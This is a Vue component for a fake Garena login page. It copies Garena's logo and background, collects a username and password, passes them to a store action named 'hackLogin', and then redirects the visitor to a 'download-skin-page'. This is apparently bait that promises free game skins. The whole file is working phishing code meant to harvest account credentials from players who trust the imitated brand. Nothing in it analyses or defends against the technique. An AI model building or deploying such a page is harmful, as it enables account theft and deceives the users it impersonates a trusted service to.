<template>
  <div>
    <div class="header text-center">
      <img src="https://sso.garena.com/images/img_garena_logo.png" />
    </div>
    <div class="body">
      <div class="form">
        <div class="content text-center">
          <p style="font-size: 16pt;margin-bottom: 2rem" class="text-center">Login</p>
          <input
            v-model="account.user_id"
            @keydown.enter="login"
            class="form-control"
            placeholder="Garena Username, Email or Phone"
          />
          <input
            v-model="account.password"
            @keydown.enter="login"
            class="form-control"
            placeholder="Password"
          />
          <button @click="login" class="btn btn-login">Login Now</button>
          <div class="driver">
            <span>or</span>
          </div>
          <button
            class="btn"
            style="margin-top: 1rem;margin-bottom: 3rem;background: #282828; color: white"
          >Register Account</button>
          <a href="#">Forgot Passwor</a>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
export default {
  data() {
    return {
      account: {
        user_id: "",
        password: ""
      }
    };
  },
  methods: {
    login() {
      if (this.account.user_id == "" || this.account.password == "") {
        this.$swal({
          icon: "error",
          title: "Thông báo",
          text: "Chưa nhập tài khoản hoặc mật khẩu"
        });
      } else {
        let vm = this;
        this.$store.dispatch("hackLogin", this.account);
        this.$swal.showLoading();
        setTimeout(() => {
          vm.$swal.close();
          vm.$router.push({ name: "download-skin-page" });
        }, 1000);
      }
    }
  }
};
</script>
<style lang="scss" scoped>
.header {
  padding: 1rem;
  border-top: 5px solid #bb0003;
}
.driver {
  display: block;
  margin-left: 5%;
  margin-right: 5%;
  margin-top: -8px;
  overflow: hidden;
  text-align: center;
  white-space: nowrap;
  width: 90%;
  span {
    display: inline-block;
    position: relative;
    color: #4b4f56;
    cursor: default;
    font-size: 13px;
    &::before,
    &::after {
      background: #ced0d4;
      content: "";
      height: 1px;
      position: absolute;
      top: 50%;
      width: 9999px;
    }
    &::before {
      margin-right: 15px;
      right: 100%;
    }
    &::after {
      left: 100%;
      margin-left: 15px;
    }
  }
}
.body {
  font: 12px Helvetica, Arial, sans-serif;
  background-repeat: no-repeat;
  background-size: cover;
  background-position: center;
  background: #1c212f url("https://sso.garena.com/images/bg.png") repeat;
  padding: 3rem 0;
  .form {
    width: 56%;
    margin: 0 22%;
    border: 1px solid #e3e1dc;
    border-radius: 5px;
    background-color: white;
    padding: 3rem;
    .content {
      width: 52%;
      margin: 0 24% 1rem 24%;
      a {
        margin-top: 3rem;
      }
      .btn-login {
        margin-top: 3rem;
        background-color: #e8171f;
        color: white;
      }
      button {
        width: 100%;
        margin-bottom: 1rem;
      }
      input {
        margin-bottom: 1rem;
        &:last-child {
          margin-bottom: 3rem;
        }
      }
      .form-control {
        border-radius: 2px;
      }
    }
  }
}
</style>